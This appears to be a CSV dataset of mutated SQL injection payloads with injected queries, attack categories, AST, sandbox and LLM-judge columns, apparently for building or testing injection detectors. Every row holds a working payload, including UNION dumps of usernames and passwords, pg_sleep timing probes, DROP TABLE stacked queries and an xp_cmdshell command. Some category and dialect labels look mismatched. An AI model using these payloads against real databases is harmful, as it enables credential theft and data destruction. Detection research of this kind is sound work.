query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q00366,"/*' UNION ALL SELECT NULL, NULL, (SELECT (CASE WHEN (EXISTS(SELECT 1 FROM users LIMIT 1)) THEN 1 ELSE 0 END))--*/","SELECT * FROM users WHERE id = /*' UNION ALL SELECT NULL, NULL, (SELECT (CASE WHEN (EXISTS(SELECT 1 FROM users LIMIT 1)) THEN 1 ELSE 0 END))--*/",nested_injection,user_lookup,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00367,-1' OR '1'=(CASE WHEN (SELECT 1 FROM users WHERE id=1) THEN '1' ELSE '0' END),SELECT * FROM users WHERE id = -1' OR '1'=(CASE WHEN (SELECT 1 FROM users WHERE id=1) THEN '1' ELSE '0' END),nested_injection,user_lookup,1,0,0.0,True,default,"[""If"", ""Column"", ""Or"", ""Paren"", ""Identifier"", ""Case"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00368,"'' UNION ALL SELECT NULL,NULL,(CAST((SELECT CONCAT(username,':',password) FROM admin) AS CHAR(100)))--","SELECT * FROM orders WHERE status = ''' UNION ALL SELECT NULL,NULL,(CAST((SELECT CONCAT(username,':',password) FROM admin) AS CHAR(100)))--' ORDER BY date DESC",nested_injection,order_filter,1,0,0.0,True,default,"[""Union"", ""Column"", ""Paren"", ""Concat"", ""Identifier"", ""Null"", ""Select"", ""DataType"", ""Subquery"", ""Table"", ""Cast"", ""From"", ""DataTypeParam"", ""Literal""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00369,"(CASE WHEN 1=1 THEN (SELECT CAST((SELECT ASCII(SUBSTRING(user_id,1,1)) FROM orders LIMIT 1) AS CHAR)) ELSE 'a' END) --","SELECT * FROM orders WHERE status = '(CASE WHEN 1=1 THEN (SELECT CAST((SELECT ASCII(SUBSTRING(user_id,1,1)) FROM orders LIMIT 1) AS CHAR)) ELSE 'a' END) --' ORDER BY date DESC",nested_injection,order_filter,1,0,0.0,True,default,"[""If"", ""Column"", ""Paren"", ""Identifier"", ""Case"", ""EQ"", ""Select"", ""DataType"", ""Subquery"", ""Table"", ""Cast"", ""Ascii"", ""Limit"", ""From"", ""Literal"", ""Substring""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00371,"--' UNION SELECT 1, 2, (SELECT username || ':' || password FROM users), 4 --","SELECT * FROM orders WHERE status = '--' UNION SELECT 1, 2, (SELECT username || ':' || password FROM users), 4 --' ORDER BY date DESC",nested_injection,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00372,1' OR EXISTS(SELECT 1 FROM admins WHERE username = (SELECT username FROM users WHERE user_id = 1)),SELECT * FROM orders WHERE status = '1' OR EXISTS(SELECT 1 FROM admins WHERE username = (SELECT username FROM users WHERE user_id = 1))' ORDER BY date DESC,nested_injection,order_filter,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00373,"1' UNION ALL SELECT NULL, NULL, NULL, (SELECT pg_sleep(5))--","SELECT * FROM orders WHERE status = '1' UNION ALL SELECT NULL, NULL, NULL, (SELECT pg_sleep(5))--' ORDER BY date DESC",nested_injection,order_filter,1,0,0.0,True,default,"[""Union"", ""Column"", ""Identifier"", ""Where"", ""Null"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""Anonymous"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00375,1' OR (SELECT 1 FROM orders WHERE product_id IN ((SELECT product_id FROM products WHERE price < 10))),SELECT * FROM orders WHERE status = '1' OR (SELECT 1 FROM orders WHERE product_id IN ((SELECT product_id FROM products WHERE price < 10)))' ORDER BY date DESC,nested_injection,order_filter,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""In"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""LT"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00376,"1' UNION ALL SELECT NULL, NULL, (SELECT username || '***' || password FROM admin LIMIT 1)--","SELECT * FROM orders WHERE status = '1' UNION ALL SELECT NULL, NULL, (SELECT username || '***' || password FROM admin LIMIT 1)--' ORDER BY date DESC",nested_injection,order_filter,1,0,0.0,True,default,"[""Union"", ""Column"", ""Identifier"", ""Where"", ""Null"", ""Select"", ""Literal"", ""Subquery"", ""Table"", ""Star"", ""Limit"", ""EQ"", ""From"", ""DPipe""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00377,(SELECT '1' FROM (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 1 THEN 1 ELSE 0 END AS flag))--,SELECT * FROM orders WHERE status = '(SELECT '1' FROM (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 1 THEN 1 ELSE 0 END AS flag))--' ORDER BY date DESC,nested_injection,order_filter,1,0,0.0,True,default,"[""If"", ""Identifier"", ""GT"", ""Case"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""From"", ""Alias"", ""Literal"", ""Count""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00378,"1' AND EXISTS(SELECT 1 FROM users WHERE username = (SELECT SUBSTRING(username, 1, 1) FROM orders WHERE product_id = 1))--","SELECT * FROM orders WHERE status = '1' AND EXISTS(SELECT 1 FROM users WHERE username = (SELECT SUBSTRING(username, 1, 1) FROM orders WHERE product_id = 1))--' ORDER BY date DESC",nested_injection,order_filter,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00379,"1') OR (1=(1)) UNION ALL SELECT username, password, NULL, NULL FROM users WHERE username = 'admin'--","SELECT * FROM orders WHERE status = '1') OR (1=(1)) UNION ALL SELECT username, password, NULL, NULL FROM users WHERE username = 'admin'--' ORDER BY date DESC",nested_injection,order_filter,1,0,0.0,True,default,"[""Union"", ""Column"", ""Or"", ""Paren"", ""Identifier"", ""Where"", ""Null"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00380,1' AND (SELECT COUNT(*) FROM users WHERE 1=1) --,"INSERT INTO comments (user_id, body) VALUES (1, '1' AND (SELECT COUNT(*) FROM users WHERE 1=1) --')",nested_injection,comment_insert,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal"", ""Count""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00381,(SELECT pg_sleep(5)) OR '1'='1',"INSERT INTO comments (user_id, body) VALUES (1, '(SELECT pg_sleep(5)) OR '1'='1'')",nested_injection,comment_insert,1,0,0.0,True,default,"[""Or"", ""Select"", ""Subquery"", ""Anonymous"", ""EQ"", ""Literal""]",True,complete_query,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00382,' OR EXTRACT(EPOCH FROM NOW()) > 1000--,"INSERT INTO comments (user_id, body) VALUES (1, '' OR EXTRACT(EPOCH FROM NOW()) > 1000--')",nested_injection,comment_insert,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""GT"", ""Var"", ""Where"", ""Extract"", ""Select"", ""Table"", ""Star"", ""Anonymous"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00383,"' UNION SELECT username, password FROM admin_table #","INSERT INTO comments (user_id, body) VALUES (1, '' UNION SELECT username, password FROM admin_table #')",nested_injection,comment_insert,1,0,0.0,True,mysql,"[""Union"", ""Column"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00385,' AND (SELECT CAST(COUNT(*) AS VARCHAR) FROM information_schema.tables INNER JOIN information_schema.columns ON information_schema.tables.table_name = information_schema.columns.table_name) --,"INSERT INTO comments (user_id, body) VALUES (1, '' AND (SELECT CAST(COUNT(*) AS VARCHAR) FROM information_schema.tables INNER JOIN information_schema.columns ON information_schema.tables.table_name = information_schema.columns.table_name) --')",nested_injection,comment_insert,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Join"", ""Where"", ""And"", ""DataType"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""Cast"", ""EQ"", ""From"", ""Literal"", ""Count""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00386,' OR (LENGTH((SELECT database()))) > 1 --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR (LENGTH((SELECT database()))) > 1 --')",nested_injection,comment_insert,1,0,0.0,True,mysql,"[""Column"", ""Or"", ""Paren"", ""Identifier"", ""GT"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""EQ"", ""CurrentSchema"", ""From"", ""Literal"", ""Length""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00388,"'; DROP TABLE IF EXISTS temp_table; CREATE TABLE temp_table(id INT, data VARCHAR); INSERT INTO temp_table VALUES(1,'Injected Data'); --","INSERT INTO comments (user_id, body) VALUES (1, ''; DROP TABLE IF EXISTS temp_table; CREATE TABLE temp_table(id INT, data VARCHAR); INSERT INTO temp_table VALUES(1,'Injected Data'); --')",nested_injection,comment_insert,1,0,0.0,True,default,"[""Column"", ""Tuple"", ""ColumnDef"", ""Identifier"", ""Semicolon"", ""Drop"", ""Where"", ""Create"", ""Insert"", ""Schema"", ""Select"", ""DataType"", ""Table"", ""Values"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00389,(SELECT @@VERSION) OR ',"INSERT INTO comments (user_id, body) VALUES (1, '(SELECT @@VERSION) OR '')",nested_injection,comment_insert,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00390,' OR 1=1 AND 0<>(SELECT * FROM users WHERE username='admin');--,SELECT * FROM users WHERE username = '' OR 1=1 AND 0<>(SELECT * FROM users WHERE username='admin');--' AND password = 'anything',tautology,login,1,1,0.0,True,default,"[""Or"", ""Star"", ""Column"", ""Subquery"", ""EQ"", ""Select"", ""Table"", ""Where"", ""And"", ""Literal"", ""Semicolon"", ""From"", ""Identifier"", ""NEQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00392,OR 1=1/**/,SELECT * FROM products WHERE name LIKE '%OR 1=1/**/%',tautology,search,1,1,0.0,True,default,"[""Or"", ""Star"", ""EQ"", ""Select"", ""Table"", ""Where"", ""Literal"", ""From"", ""Identifier""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00393,'/**/,SELECT * FROM products WHERE name LIKE '%'/**/%',tautology,search,1,1,0.0,True,default,"[""Star"", ""Column"", ""EQ"", ""Select"", ""Table"", ""Where"", ""Literal"", ""From"", ""Identifier""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00395,' OR 1=1 //,SELECT * FROM products WHERE name LIKE '%' OR 1=1 //%',tautology,search,1,1,0.0,True,snowflake,"[""Or"", ""Star"", ""Column"", ""EQ"", ""Select"", ""Table"", ""Where"", ""Literal"", ""From"", ""Identifier""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00397,) OR 1=1;--,SELECT * FROM users WHERE id = ) OR 1=1;--,tautology,user_lookup,1,1,0.0,True,default,"[""Star"", ""Column"", ""EQ"", ""Select"", ""Table"", ""Where"", ""Literal"", ""From"", ""Identifier""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00398,-- OR '1'='1',SELECT * FROM orders WHERE status = '-- OR '1'='1'' ORDER BY date DESC,tautology,order_filter,1,1,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00400,""" OR ""status"">""active""","INSERT INTO comments (user_id, body) VALUES (1, '"" OR ""status"">""active""')",tautology,comment_insert,1,1,0.0,True,default,"[""Star"", ""Column"", ""EQ"", ""Select"", ""Table"", ""Where"", ""Literal"", ""From"", ""Identifier""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00405,' AND EXISTS(SELECT 1 FROM users WHERE username = 'admin') --,SELECT * FROM products WHERE name LIKE '%' AND EXISTS(SELECT 1 FROM users WHERE username = 'admin') --%',union_based,search,1,1,0.0,True,default,"[""Star"", ""Column"", ""EQ"", ""Select"", ""Exists"", ""Table"", ""Where"", ""And"", ""Literal"", ""From"", ""Identifier""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00406,) OR NOT EXISTS(SELECT 1 FROM products WHERE price < (SELECT AVG(price) FROM products)) --,SELECT * FROM products WHERE name LIKE '%) OR NOT EXISTS(SELECT 1 FROM products WHERE price < (SELECT AVG(price) FROM products)) --%',union_based,search,1,1,0.0,True,default,"[""Star"", ""Column"", ""EQ"", ""Select"", ""Table"", ""Where"", ""Literal"", ""From"", ""Identifier""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00409,' UNION SELECT user FROM information_schema.tables WHERE table_schema='database_name'--,SELECT * FROM users WHERE id = ' UNION SELECT user FROM information_schema.tables WHERE table_schema='database_name'--,union_based,user_lookup,1,1,0.0,True,default,"[""Star"", ""Union"", ""Column"", ""EQ"", ""Select"", ""Table"", ""Where"", ""Literal"", ""From"", ""Identifier""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00410,' UNION SELECT username || ':' || password FROM users --,SELECT * FROM users WHERE id = ' UNION SELECT username || ':' || password FROM users --,union_based,user_lookup,1,1,0.0,True,default,"[""DPipe"", ""Star"", ""Union"", ""Column"", ""EQ"", ""Select"", ""Table"", ""Where"", ""Literal"", ""From"", ""Identifier""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00411,"') UNION SELECT username || ',' || password FROM users --","SELECT * FROM orders WHERE status = '') UNION SELECT username || ',' || password FROM users --' ORDER BY date DESC",union_based,order_filter,1,1,0.0,True,default,"[""DPipe"", ""Star"", ""Union"", ""Column"", ""EQ"", ""Select"", ""Paren"", ""Table"", ""Where"", ""Literal"", ""From"", ""Identifier""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00412,; EXEC xp_cmdshell 'ping -n 10 127.0.0.1';--,SELECT * FROM orders WHERE status = '; EXEC xp_cmdshell 'ping -n 10 127.0.0.1';--' ORDER BY date DESC,union_based,order_filter,1,1,0.0,True,postgres,"[""Semicolon"", ""Literal"", ""Command""]",True,complete_query,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
